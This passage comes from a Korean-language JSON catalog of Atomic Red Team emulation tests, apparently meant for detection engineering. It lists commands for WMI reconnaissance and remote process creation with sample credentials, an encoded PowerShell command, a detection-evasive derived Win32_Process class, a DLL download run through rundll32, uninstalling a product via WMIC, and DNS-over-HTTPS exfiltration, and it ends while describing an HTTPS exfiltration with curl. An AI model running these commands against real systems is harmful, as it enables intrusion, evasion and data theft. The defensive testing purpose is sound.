      "name": "Remote Desktop Services Discovery via PowerShell",
      "platforms": ["windows"],

      "summary": "PowerShell의 Get-Service cmdlet을 사용해 로컬 시스템에서 원격 데스크톱 관련 서비스(Remote Desktop Services, Remote Desktop Configuration)의 상태를 조회하는 간단한 서비스 발견 시나리오이다. 이를 통해 RDP 기능 활성화 여부를 확인할 수 있다.",

      "procedure": [
        "관리자 권한 PowerShell 세션을 실행한다.",
        "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\" 명령을 수행한다.",
        "각 서비스의 Status, DisplayName, ServiceName 등을 통해 RDP 관련 서비스가 실행 중인지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\""
        }
      ],

      "prerequisites": [
        "PowerShell을 관리자 권한으로 실행할 수 있어야 한다.",
        "로컬 시스템에 Remote Desktop Services 및 Remote Desktop Configuration 서비스가 존재해야 한다(일부 에디션에서는 서비스 이름이 다를 수 있음)."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "RDP 관련 Windows 서비스의 상태를 조회하는 PowerShell 프로세스",
            "commandline_pattern": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\""
          }
        ],
        "network": []
      },

      "cleanup": [
        "서비스 상태 조회만 수행하므로 별도의 클린업 작업은 필요 없다.",
        "PowerShell 실행 기록(히스토리, 로그)이 민감하다면 세션 종료 후 정리 정책에 따라 관리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "9e55750e-4cbf-4013-9627-e9a045b541bf"
      }
    }
  ]
},
{
  "technique_id": "T1047",
  "technique_name": "Windows Management Instrumentation",
  "tactic": "Execution",
  "description": "Windows Management Instrumentation(WMI)는 Windows 시스템의 다양한 정보 조회 및 관리 작업을 위한 인터페이스로, 명령 실행·프로세스 생성·서비스 조회·소프트웨어 관리 등에 악용될 수 있다. 공격자는 wmic.exe나 PowerShell WMI cmdlet을 사용해 원격·로컬에서 명령을 실행하고, 계정·프로세스·패치 정보 등 정찰과 권한 유지, 보안 제품 제거 등에 활용한다.",

  "tests": [
    {
      "test_id": "T1047-1",
      "name": "WMI Reconnaissance Users",
      "platforms": ["windows"],

      "summary": "wmic useraccount 쿼리를 통해 로컬 시스템의 모든 사용자 계정을 나열하는 정찰 시나리오이다. WMI를 이용해 계정 목록 및 속성을 한 번에 수집함으로써 계정 구조를 파악하는 행위를 모사한다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "wmic useraccount get /ALL /format:csv 명령을 실행해 모든 로컬 사용자 계정 정보를 CSV 형식으로 조회한다.",
        "출력된 CSV 결과에서 계정 이름, SID, 상태 등 계정 관련 정보를 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic useraccount get /ALL /format:csv"
        }
      ],

      "prerequisites": [
        "wmic.exe가 시스템에 존재하고 PATH에 포함되어 있어야 한다.",
        "로컬 사용자 계정 정보를 조회할 수 있는 권한(일반 사용자 권한으로도 대부분 조회 가능)이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "로컬 사용자 계정 정보를 조회하는 WMI 명령줄 유틸리티",
            "commandline_pattern": "wmic useraccount get /ALL /format:csv"
          }
        ],
        "network": []
      },

      "cleanup": [
        "콘솔 출력만 발생하며 디스크에 별도 파일을 남기지 않으므로 추가적인 클린업은 필요 없다."
      ],

      "metadata": {
        "atomic_source_id": "c107778c-dcf5-47c5-af2e-1d058a3df3ea"
      }
    },

    {
      "test_id": "T1047-2",
      "name": "WMI Reconnaissance Processes",
      "platforms": ["windows"],

      "summary": "wmic process 쿼리를 이용해 현재 실행 중인 프로세스 목록과 실행 경로, 명령줄 인자를 수집하는 정찰 시나리오이다. 공격자는 이를 통해 보안 제품·관리 에이전트·기타 프로세스를 식별하고 후속 공격에 활용할 수 있다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "wmic process get caption,executablepath,commandline /format:csv 명령을 실행한다.",
        "각 프로세스의 이름(caption), 실행 파일 경로(executablepath), 명령줄(commandline)을 CSV 형식으로 출력된 결과에서 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic process get caption,executablepath,commandline /format:csv"
        }
      ],

      "prerequisites": [
        "wmic.exe가 설치되어 있어야 한다.",
        "프로세스 목록을 조회할 수 있는 권한(일반 사용자 권한으로도 대부분 가능)이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "실행 중인 프로세스 정보(이름, 경로, 명령줄)를 WMI를 통해 조회하는 유틸리티",
            "commandline_pattern": "wmic process get caption,executablepath,commandline /format:csv"
          }
        ],
        "network": []
      },

      "cleanup": [
        "콘솔 출력만 발생하며 디스크에 별도 파일을 남기지 않으므로 추가적인 클린업은 필요 없다."
      ],

      "metadata": {
        "atomic_source_id": "5750aa16-0e59-4410-8b9a-8a47ca2788e2"
      }
    },

    {
      "test_id": "T1047-3",
      "name": "WMI Reconnaissance Software",
      "platforms": ["windows"],

      "summary": "wmic qfe 쿼리를 사용해 설치된 핫픽스 및 패치 목록을 수집하는 정찰 시나리오이다. 공격자는 패치 이력을 확인해 특정 취약점(CVE)이 미패치된 시스템을 찾아낼 수 있다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "wmic qfe get description,installedOn /format:csv 명령을 실행한다.",
        "출력된 CSV에서 각 패치의 설명(description)과 설치일(InstalledOn)을 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic qfe get description,installedOn /format:csv"
        }
      ],

      "prerequisites": [
        "wmic.exe가 시스템에 존재해야 한다.",
        "WMI를 통해 핫픽스/패치 정보에 접근할 수 있는 권한이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "설치된 핫픽스 및 패치 정보를 조회하는 WMI 유틸리티",
            "commandline_pattern": "wmic qfe get description,installedOn /format:csv"
          }
        ],
        "network": []
      },

      "cleanup": [
        "콘솔 출력만 남으며 디스크의 변경은 없으므로 추가 클린업은 필요 없다."
      ],

      "metadata": {
        "atomic_source_id": "718aebaa-d0e0-471a-8241-c5afa69c7414"
      }
    },

    {
      "test_id": "T1047-4",
      "name": "WMI Reconnaissance List Remote Services",
      "platforms": ["windows"],

      "summary": "원격 또는 로컬 노드에서 특정 서비스가 실행 중인지 확인하기 위해 wmic service 쿼리를 수행하는 시나리오이다. 기본값으로 로컬(127.0.0.1)과 인쇄 스풀러(Spooler)를 조회하며, 원격 RPC 오류나 서비스 미존재 시의 응답도 함께 확인할 수 있다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\") 명령을 실행한다.",
        "지정한 node(기본 127.0.0.1)에서 service_search_string(기본 Spooler)이 포함된 서비스 정보를 조회한다.",
        "\"No instance(s) Available\" 메시지가 나오면 서비스가 없음을, RPC 오류 메시지가 나오면 원격 노드에 접근 불가 상태임을 의미한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")"
        }
      ],

      "prerequisites": [
        "wmic.exe가 설치되어 있어야 한다.",
        "원격 노드에 접근할 경우 RPC/WMI 트래픽이 방화벽에 의해 허용되어야 한다.",
        "원격 서비스를 조회할 권한(해당 노드에 대한 적절한 자격 증명 또는 익명 접근 허용 설정)이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "원격 또는 로컬 노드의 서비스 상태를 WMI를 통해 조회하는 프로세스",
            "commandline_pattern": "wmic /node:* service where (caption like \"%*%\")"
          }
        ],
        "network": [
          {
            "protocol": "TCP",
            "description": "WMIC가 원격 노드 #{node}에 RPC/WMI를 통해 접속하려는 트래픽",
            "destination_pattern": "#{node}:RPC/*"
          }
        ]
      },

      "cleanup": [
        "원격 서비스 조회만 수행하므로 추가적인 클린업은 필요 없다.",
        "원격 접근 실패 시의 오류 메시지는 콘솔에만 남는다."
      ],

      "metadata": {
        "atomic_source_id": "0fd48ef7-d890-4e93-a533-f7dedd5191d3"
      }
    },

    {
      "test_id": "T1047-5",
      "name": "WMI Execute Local Process",
      "platforms": ["windows"],

      "summary": "wmic process call create를 사용해 로컬 호스트에서 프로세스를 생성하는 시나리오이다. 기본값으로 notepad.exe를 실행하며, cleanup 단계에서 동일한 이름의 프로세스를 WMI를 이용해 종료한다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "wmic process call create #{process_to_execute} 명령을 실행해 로컬에서 지정된 프로세스를 생성한다(기본 notepad.exe).",
        "작업 관리자 또는 프로세스 목록에서 새로운 프로세스가 실행 중인지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic process call create #{process_to_execute}"
        }
      ],

      "prerequisites": [
        "wmic.exe가 존재하고 프로세스 생성 권한(일반적으로 사용자 권한) 이 있어야 한다.",
        "process_to_execute로 지정한 실행 파일이 PATH에 있거나 전체 경로가 유효해야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "WMI를 이용해 로컬 프로세스를 생성하는 유틸리티",
            "commandline_pattern": "wmic process call create *"
          },
          {
            "name": "#{process_to_execute}",
            "description": "WMI를 통해 생성된 새 로컬 프로세스(기본: notepad.exe)",
            "commandline_pattern": "*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "wmic process where name='#{process_to_execute}' delete 명령을 사용해 생성된 프로세스를 종료할 수 있다.",
        "GUI 애플리케이션일 경우 수동으로 창을 닫아서 종료해도 된다."
      ],

      "metadata": {
        "atomic_source_id": "b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3"
      }
    },

    {
      "test_id": "T1047-6",
      "name": "WMI Execute Remote Process",
      "platforms": ["windows"],

      "summary": "wmic /user /password /node 옵션을 사용해 원격 호스트에서 프로세스를 생성하는 시나리오이다. 제공된 자격 증명(DOMAIN\\Administrator / P@ssw0rd1)을 사용해 원격 노드에 접속한 뒤 notepad.exe를 실행하는 예시를 모사한다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute} 명령을 실행한다.",
        "지정된 원격 호스트 #{node}에 WMI를 통해 접속하여 #{process_to_execute}(기본 notepad.exe)를 생성한다.",
        "원격 호스트 측에서 작업 관리자나 세션을 통해 프로세스가 실행되었는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}"
        }
      ],

      "prerequisites": [
        "원격 호스트 #{node}에 대해 WMI/RPC 트래픽이 방화벽에서 허용되어야 한다.",
        "user_name과 password로 지정된 계정이 원격 호스트에 존재하며 WMI/원격 프로세스 생성 권한을 가지고 있어야 한다.",
        "원격 호스트에서 process_to_execute로 지정된 실행 파일을 찾을 수 있어야 한다(PATH 또는 전체 경로)."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "자격 증명을 이용해 원격 노드에서 프로세스를 생성하는 WMI 명령줄 유틸리티",
            "commandline_pattern": "wmic /user:* /password:* /node:* process call create *"
          }
        ],
        "network": [
          {
            "protocol": "TCP",
            "description": "wmic가 원격 노드 #{node}에 접속해 프로세스를 생성하기 위한 RPC/WMI 트래픽",
            "destination_pattern": "#{node}:RPC/*"
          }
        ]
      },

      "cleanup": [
        "cleanup_command로 wmic ... process where name='#{process_to_execute}' delete 명령을 사용해 원격 호스트에서 해당 프로세스를 종료할 수 있다.",
        "원격 시스템에서 직접 프로세스를 종료해도 된다."
      ],

      "metadata": {
        "atomic_source_id": "9c8ef159-c666-472f-9874-90c8d60d136b"
      }
    },

    {
      "test_id": "T1047-7",
      "name": "Create a Process using WMI Query and an Encoded Command",
      "platforms": ["windows"],

      "summary": "PowerShell -EncodedCommand 옵션을 사용해 WMI 기반 프로세스 생성을 감추는 시나리오이다. Base64로 인코딩된 명령은 Invoke-WmiMethod win32_process -Name create -ArgumentList notepad.exe를 수행하며, 결과적으로 WMI를 통해 notepad.exe가 생성된다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "powershell -exec bypass -e <Base64 명령> 형태의 명령을 실행한다.",
        "Base64로 인코딩된 내용은 Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe 명령을 디코딩해 실행한다.",
        "테스트 완료 후 notepad.exe 프로세스가 실행 중인지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA"
        }
      ],

      "prerequisites": [
        "PowerShell이 설치되어 있어야 하며, -ExecutionPolicy Bypass/-exec bypass 옵션으로 실행이 가능해야 한다.",
        "WMI(win32_process 클래스)를 통해 프로세스 생성이 가능한 환경이어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "EncodedCommand를 디코딩해 WMI를 통해 notepad.exe를 생성하는 PowerShell 프로세스",
            "commandline_pattern": "powershell -exec bypass -e *"
          },
          {
            "name": "notepad.exe",
            "description": "WMI(Invoke-WmiMethod win32_process) 호출 결과 생성된 프로세스",
            "commandline_pattern": "*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "실행된 notepad.exe 프로세스를 수동으로 종료하거나 작업 관리자를 통해 종료할 수 있다.",
        "PowerShell 히스토리나 로그에 남은 EncodedCommand 사용 흔적은 DFIR 목적에 따라 정리 여부를 결정할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "7db7a7f9-9531-4840-9b30-46220135441c"
      }
    },

    {
      "test_id": "T1047-8",
      "name": "Create a Process using obfuscated Win32_Process",
      "platforms": ["windows"],

      "summary": "기존 Win32_Process 클래스를 상속한 새 WMI 클래스를 생성한 뒤, 해당 파생 클래스를 통해 프로세스를 생성하는 은폐 기법을 시뮬레이션한다. 보안 솔루션이 Win32_Process::Create 호출만을 탐지할 경우 탐지를 우회할 수 있는 패턴을 재현한다.",

      "procedure": [
        "관리자 권한 PowerShell을 실행한다.",
        "New-Object Management.ManagementClass와 ManagementPath(\"Win32_Process\")를 이용해 기본 Win32_Process 클래스를 참조한다.",
        "Derive(\"#{new_class}\")를 호출해 새 파생 클래스(기본 Win32_Atomic)를 생성하고 Put()으로 WMI 저장소에 등록한다.",
        "Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute} 명령을 사용해 파생 클래스를 통해 프로세스를 생성한다.",
        "cleanup 단계에서 새로 만든 클래스 인스턴스를 Delete()해 정리한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\")); $NewClass = $Class.Derive(\"#{new_class}\"); $NewClass.Put(); Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}"
        }
      ],

      "prerequisites": [
        "관리자 권한 PowerShell 실행 권한이 필요하다.",
        "System.Management(ManagementClass, ManagementPath)를 사용할 수 있는 .NET 환경이어야 한다.",
        "WMI 저장소에 새 클래스를 생성할 수 있는 권한이 있어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WMI 파생 클래스를 생성하고 해당 클래스를 통해 프로세스를 생성하는 PowerShell 프로세스",
            "commandline_pattern": "New-Object Management.ManagementClass*Win32_Process*; *Derive*; *Invoke-WmiMethod -Path #{new_class} -Name create*"
          },
          {
            "name": "#{process_to_execute}",
            "description": "파생 WMI 클래스(기본 Win32_Atomic)를 통해 생성된 프로세스(기본: notepad.exe)",
            "commandline_pattern": "*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "$CleanupClass.Delete()를 이용해 새로 생성한 WMI 파생 클래스를 제거한다.",
        "실행된 #{process_to_execute} 프로세스가 남아 있다면 수동 또는 별도 방법으로 종료할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "10447c83-fc38-462a-a936-5102363b1c43"
      }
    },

    {
      "test_id": "T1047-9",
      "name": "WMI Execute rundll32",
      "platforms": ["windows"],

      "summary": "wmic process call create를 이용해 rundll32.exe로 지정된 DLL의 함수를 호출하는 시나리오이다. 먼저 PowerShell로 calc.dll을 원격에서 다운로드해 디스크에 저장한 뒤, WMI를 통해 rundll32.exe \"dll\" 함수 형식으로 실행한다.",

      "procedure": [
        "PowerShell을 사용해 #{dll_to_execute} 경로에 DLL이 존재하는지 Test-Path로 확인한다.",
        "없을 경우 ExternalPayloads 디렉터리를 생성하고 GitHub URL에서 calc.dll을 다운로드해 #{dll_to_execute} 경로에 저장한다.",
        "명령 프롬프트에서 wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\" 명령을 실행해 원격 또는 로컬 노드에서 rundll32를 통해 DLL 함수를 실행한다.",
        "DLL이 calc.dll인 경우 계산기 프로세스가 실행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\""
        }
      ],

      "prerequisites": [
        "PowerShell에서 #{dll_to_execute} 경로에 DLL이 존재하는지 확인하고, 없으면 원격에서 다운로드해야 한다.",
        "GitHub(raw URL)에 대한 HTTPS 접근이 허용되어야 calc.dll을 내려받을 수 있다.",
        "노드 #{node}에 대해 WMI/RPC를 통한 프로세스 생성 권한이 필요하다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll",
            "description": "GitHub에서 다운로드된 테스트용 DLL(calc.dll)"
          }
        ],
        "files_read": [
          {
            "path": "#{dll_to_execute}",
            "description": "rundll32.exe가 로드해 실행할 DLL 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "rundll32.exe를 이용해 DLL 함수를 실행하도록 WMI를 통해 프로세스를 생성하는 유틸리티",
            "commandline_pattern": "wmic /node:* process call create \"rundll32.exe *\""
          },
          {
            "name": "rundll32.exe",
            "description": "지정된 DLL(예: calc.dll)의 함수를 호출하는 프로세스",
            "commandline_pattern": "rundll32.exe \"#{dll_to_execute}\" #{function_to_execute}"
          },
          {
            "name": "calculator.exe",
            "description": "calc.dll 실행 결과로 생성될 수 있는 계산기 프로세스(환경에 따라 이름이 다를 수 있음)",
            "commandline_pattern": "*"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "GitHub에서 calc.dll을 다운로드하는 트래픽",
            "destination_pattern": "github.com/redcanaryco/atomic-red-team/*/calc.dll*"
          },
          {
            "protocol": "TCP",
            "description": "원격 노드 #{node}로 WMI/RPC를 통해 프로세스 생성 요청을 보내는 트래픽",
            "destination_pattern": "#{node}:RPC/*"
          }
        ]
      },

      "cleanup": [
        "cleanup_command에서 taskkill /f /im calculator.exe를 통해 실행된 계산기 프로세스를 강제로 종료한다.",
        "테스트 후 필요 없다면 ExternalPayloads 폴더의 calc.dll도 수동으로 삭제할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "00738d2a-4651-4d76-adf2-c43a41dfb243"
      }
    },

    {
      "test_id": "T1047-10",
      "name": "Application uninstall using WMIC",
      "platforms": ["windows"],

      "summary": "wmic product where ... call uninstall 명령을 사용해 MSI 기반으로 설치된 애플리케이션을 제거하는 시나리오이다. APT가 보안 제품(TightVNC 등)을 제거하기 위해 사용할 수 있는 패턴을 모사하며, 사전 단계에서 TightVNC를 설치한 뒤 WMIC로 언인스톨을 수행한다.",

      "procedure": [
        "PowerShell에서 TightVNC 실행 파일 경로(C:\\Program Files 또는 C:\\Program Files (x86))가 존재하는지 Test-Path로 확인해 설치 여부를 판단한다.",
        "설치되어 있지 않은 경우, TightVNC MSI 설치 파일을 ExternalPayloads 폴더로 다운로드하고 msiexec /i ... /qn /norestart 명령으로 무인 설치를 수행한다.",
        "명령 프롬프트를 관리자 권한으로 실행한다.",
        "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall 명령을 실행해 대상 제품(기본 Tightvnc)을 언인스톨한다.",
        "WMIC 출력에서 언인스톨 성공/실패 상태를 확인한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall"
        }
      ],

      "prerequisites": [
        "PowerShell을 이용해 TightVNC가 사전에 설치되어 있어야 하며, 없으면 get_prereq_command를 통해 설치한다.",
        "msiexec를 이용해 MSI 패키지를 설치·제거할 수 있는 관리자 권한이 필요하다.",
        "WMIC product 언인스톨이 동작하도록 Windows Installer 기반 설치 제품이어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\tightvncinstaller.msi",
            "description": "TightVNC 설치를 위한 MSI 인스톨러 파일"
          }
        ],
        "files_read": [
          {
            "path": "C:\\Program Files\\TightVNC\\tvnviewer.exe",
            "description": "사전 설치 여부 확인에 사용될 수 있는 TightVNC 실행 파일 경로(64비트)"
          },
          {
            "path": "C:\\Program Files (x86)\\TightVNC\\tvnviewer.exe",
            "description": "사전 설치 여부 확인에 사용될 수 있는 TightVNC 실행 파일 경로(32비트)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "TightVNC 설치 여부 확인 및 MSI 설치 파일 다운로드·설치를 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Invoke-WebRequest *tightvnc* -OutFile *tightvncinstaller.msi*; msiexec /i *tightvncinstaller.msi* /qn /norestart"
          },
          {
            "name": "msiexec.exe",
            "description": "TightVNC MSI 패키지를 설치 또는 재설치·제거하는 Windows Installer 프로세스",
            "commandline_pattern": "msiexec /i *tightvncinstaller.msi* /qn /norestart"
          },
          {
            "name": "wmic.exe",
            "description": "WMIC product 클래스를 이용해 지정된 애플리케이션을 언인스톨하는 유틸리티",
            "commandline_pattern": "wmic /node:* product where \"name like *\" call uninstall"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "TightVNC MSI 설치 파일을 다운로드하기 위한 트래픽",
            "destination_pattern": "www.tightvnc.com/download/*/tightvnc-*-setup-64bit.msi"
          }
        ]
      },

      "cleanup": [
        "cleanup_command로 msiexec /i ... tightvncinstaller.msi /qn /norestart를 다시 실행해 TightVNC를 재설치할 수 있다(환경을 원상복구).",
        "테스트 후 ExternalPayloads 폴더의 tightvncinstaller.msi를 삭제해 인스톨러 흔적을 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "c510d25b-1667-467d-8331-a56d3e9bc4ff"
      }
    }
  ]
},
{
  "technique_id": "T1048",
  "technique_name": "Exfiltration Over Alternative Protocol",
  "tactic": "Exfiltration",
  "description": "공격자가 HTTP/HTTPS, DNS, SSH 등 일반적인 C2 채널 이외의 프로토콜을 활용해 데이터를 외부로 유출하는 기법이다. 보안 솔루션이 주로 감시하는 전통적인 채널을 우회하기 위해 대체 프로토콜을 악용하며, DNS 터널링이나 DNS-over-HTTPS(DoH) 등 은닉 채널을 통해 파일·명령 스크립트 등을 전송할 수 있다.",

  "tests": [
    {
      "test_id": "T1048-1",
      "name": "DNSExfiltration (doh)",
      "platforms": ["windows"],

      "summary": "DNSExfiltrator PowerShell 모듈을 이용해 DNS 요청을 통해 파일을 유출하는 DNS 터널링 시나리오이다. 전달되는 DNS 쿼리를 DNS-over-HTTPS(DoH)로 감싸 전송함으로써, 일반 DNS 트래픽뿐 아니라 HTTPS 기반 DoH 트래픽을 통한 은닉 유출도 재현한다.",

      "procedure": [
        "지정한 경로(ps_module)에 DNSExfiltrator PowerShell 스크립트가 존재하는지 Test-Path로 확인한다.",
        "존재하지 않으면 ExternalPayloads 디렉터리를 생성하고 GitHub(raw.githubusercontent.com)에서 Invoke-DNSExfiltrator.ps1을 다운로드해 ps_module 위치에 저장한다.",
        "PowerShell에서 Import-Module \"#{ps_module}\" 명령으로 DNSExfiltrator 모듈을 로드한다.",
        "Invoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding} 명령을 실행해, 지정한 도메인으로 DoH 기반 DNS 요청을 반복 전송하며 파일(여기서는 ps_module 자체)을 유출한다.",
        "실행 중 생성되는 DNS/DoH 트래픽과 도메인 쿼리 패턴을 네트워크 모니터링 도구로 관찰할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Import-Module \"#{ps_module}\"; Invoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}"
        }
      ],

      "prerequisites": [
        "테스트용 도메인 #{domain}에 대해 A 레코드와 NS 레코드가 공격자 제어 하에 설정되어 있어야 한다.",
        "ps_module 경로에 DNSExfiltrator PowerShell 스크립트가 존재해야 하며, 없을 경우 GitHub에서 다운로드할 수 있어야 한다.",
        "지정된 DoH 서버(google 또는 cloudflare)에 대한 HTTPS 통신이 허용되어 있어야 한다.",
        "Windows 환경에서 PowerShell 스크립트 실행이 허용되어야 하며, ExecutionPolicy가 제한적일 경우 우회 설정이 필요할 수 있다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1",
            "description": "GitHub에서 다운로드된 DNSExfiltrator PowerShell 모듈(Invoke-DNSExfiltrator.ps1)"
          }
        ],
        "files_read": [
          {
            "path": "#{ps_module}",
            "description": "Import-Module 및 Invoke-DNSExfiltrator -i 인자로 사용되는 PowerShell 스크립트 파일 (예: 유출 대상 파일로도 사용)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "DNSExfiltrator 모듈을 로드하고 Invoke-DNSExfiltrator를 실행해 DoH 기반 DNS 터널링을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Import-Module *dnsexfil.ps1*; Invoke-DNSExfiltrator -i * -d * -p * -doh * -t *"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "GitHub에서 Invoke-DNSExfiltrator.ps1(DNSExfiltrator 모듈)을 다운로드하는 트래픽",
            "destination_pattern": "raw.githubusercontent.com/Arno0x/DNSExfiltrator/*/Invoke-DNSExfiltrator.ps1"
          },
          {
            "protocol": "DNS/DoH",
            "description": "Invoke-DNSExfiltrator 실행 중 생성되는 반복적인 DNS 쿼리 및 DNS-over-HTTPS(google 또는 cloudflare) 트래픽",
            "destination_pattern": "#{domain} (DNS 쿼리) 및 선택된 DoH 서버(예: dns.google, cloudflare-dns.com)"
          }
        ]
      },

      "cleanup": [
        "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1 파일을 삭제해 DNSExfiltrator 모듈을 제거할 수 있다.",
        "테스트 중 생성된 DNS/DoH 로그는 DFIR 목적으로 보존하거나, 정책에 따라 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "c943d285-ada3-45ca-b3aa-7cd6500c6a48"
      }
    }
  ]
},
{
  "technique_id": "T1048.002",
  "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
  "tactic": "Exfiltration",
  "description": "공격자가 C2 채널이 아닌 일반 HTTPS 등의 비-C2 비대칭 암호화(예: TLS)를 사용하는 프로토콜을 악용해 데이터를 유출하는 기법이다. 파일 공유 서버나 임의의 HTTPS 엔드포인트로 데이터를 업로드함으로써, 정상적인 웹 트래픽처럼 위장해 탐지를 회피할 수 있다.",

  "tests": [
    {
      "test_id": "T1048.002-1",
      "name": "Exfiltrate data HTTPS using curl windows",
      "platforms": ["windows"],

      "summary": "Windows 환경에서 curl.exe를 이용해 HTTPS 파일 공유 서비스(file.io)로 데이터를 업로드하는 시나리오이다. 사전 단계에서 curl이 없으면 다운로드하여 C:\\Windows\\System32\\Curl.exe로 배치하고, 테스트용 파일(artifact)을 준비한 후 HTTPS POST 업로드를 수행한다.",

      "procedure": [
        "PowerShell에서 Test-Path #{curl_path}로 시스템에 curl.exe가 존재하는지 확인한다.",
        "존재하지 않을 경우 ExternalPayloads 디렉터리를 만들고, curl 공식 사이트에서 Windows용 curl.zip을 다운로드한 뒤 Expand-Archive로 압축을 해제한다.",
        "해제된 폴더에서 curl.exe를 C:\\Windows\\System32\\Curl.exe 위치로 복사해 시스템 전역에서 사용 가능하도록 한다.",
        "다음으로 Test-Path \"#{input_file}\"로 업로드 대상 테스트 파일이 존재하는지 확인한다.",
